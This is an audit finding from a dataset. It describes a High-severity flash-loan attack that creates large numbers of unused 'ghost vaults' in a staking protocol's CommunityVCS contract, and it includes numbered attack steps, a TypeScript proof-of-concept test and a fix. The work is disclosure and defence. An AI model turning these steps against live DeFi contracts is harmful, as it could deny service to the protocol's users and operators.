# [H] Flash loan attack can potentially create an unmanageable number of ghost vaults in CommunityVCS

## Summary
Severity: High
Contest weight: 0.6078
Dataset id: 21934
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
** The current implementation of the `CommunityVCS` allows for a potential attack vector where an attacker can artificially inflate the number of vaults to an arbitrarily large number. This attack exploits the fact that `globalState.depositIndex` is monotonically increasing and is not reset when earlier vaults become empty. As a result, each iteration of this attack can push the `depositIndex` further, leading to the creation of ghost vaults which will never be used.

Consider following attack vector:
1. Obtain a flash loan for a large amount of tokens. Choose a token amount such that they trigger the `vaultDeploymentThreshold` condition
2. Deposit these tokens into the Priority Pool without specifying vault IDs.
3. This triggers a deposit into the Staking Pool, which in turn calls the deposit function of the CommunityVCS.
4. Since no vault IDs are provided, the deposit starts from `globalState.depositIndex` and continues until the deposit is fully allocated or all vaults are filled. This updates `globalState.depositIndex` to a bigger number
5. Call performUpkeep on CommunityVCS, which deploys new vaults.
6. Repeat steps 1-5
7. Assuming there is enough exit liquidity from all strategies in StakingPool, attacker can withdraw all deposited tokens to repay the flash loan

** Managing an unnecessarily large number of vaults severely complicates protocol operations and maintenance. Critical functions like `updateDeposits`, which are essential for maintaining accurate vault accounting, become extremely expensive to execute. This is because the `getDepositChange` function, which tracks the latest total deposits across all vaults, must loop over every available vault. In extreme cases, this could lead to a denial-of-service condition for functions that need to iterate over all vaults

## Proof of Concept
**
```typescript
it(`flash loan attack to max out community vaults`, async () => {
    const {
        token,
        accounts,
        signers,
        adrs,
        strategy,
        priorityPool,
        stakingPool,
        stakingController,
        rewardsController,
        updateVaultGroups,
    } = await loadFixture(deployCommunityVaultFixtureWithStrategyMock)
    //@note this fixture uses a strategy mock to simulate a strategy with a max deposit of 900 tokens
    //@note by now, that strategy is already full -> so any further deposits go into the Community VCS

    console.log(`strategies length ${(await stakingPool.getStrategies()).length}`)
    assert.equal((await strategy.getVaults()).length, 20)
    await stakingPool.deposit(accounts[0], toEther(1500), [encodeVaults([]), encodeVaults([])])

    // get initial deposit index
    const [, , , depositIndex] = await strategy.globalVaultState()
    console.log(`deposit index`, depositIndex.toString())

    await strategy.performUpkeep(encodeVaults([]))
    assert.equal((await strategy.getVaults()).length, 40) //@audit 20 new vaults are created

    await updateVaultGroups([0, 5, 10], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([1, 6, 11], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([2, 7], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([3, 8], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([4, 9], 300)

    //@note a user can flashloan 1100 tokens -> deposit them with no vaultIds -> deposit index moves to 26
    await stakingPool.setPriorityPool(adrs.priorityPool)
    await token.approve(adrs.strategy, ethers.MaxUint256)
    await token.connect(signers[2]).approve(priorityPool.target, ethers.MaxUint256)
    await priorityPool
      .connect(signers[2])
      .deposit(toEther(1100), false, [encodeVaults([]), encodeVaults([])])

    const [, , , newDepositIndex] = await strategy.globalVaultState()

    //@note user can then performUpkeep (or wait for keeper to do this) to further increase vaults to 60
    await strategy.performUpkeep(encodeVaults([]))
    assert.equal((await strategy.getVaults()).length, 60) //@audit 20 new vaults are created again

    //@note 300 is now available for withdrawal
    //@note 800 is withdrawable from first strategy
    //@note creating a mock staking pool to simulate this

    //@note 800 + 300 -> total withdrawable is 1100
    //@note user can then withdraw complete amount to repay flash without queueing

    await stakingPool.connect(signers[2]).approve(adrs.priorityPool, ethers.MaxUint256)
    await priorityPool
      .connect(signers[2])
      .withdraw(toEther(1100), toEther(1100), toEther(1100), [], false, false, [
        encodeVaults([]),
        encodeVaults([0, 5, 10]),
      ])
})
```

## Recommendation
** Consider implementing a mechanism to recycle empty vaults instead of always creating new ones. Also to nullify the flash loan vectors, consider adding a time delay for withdrawals.
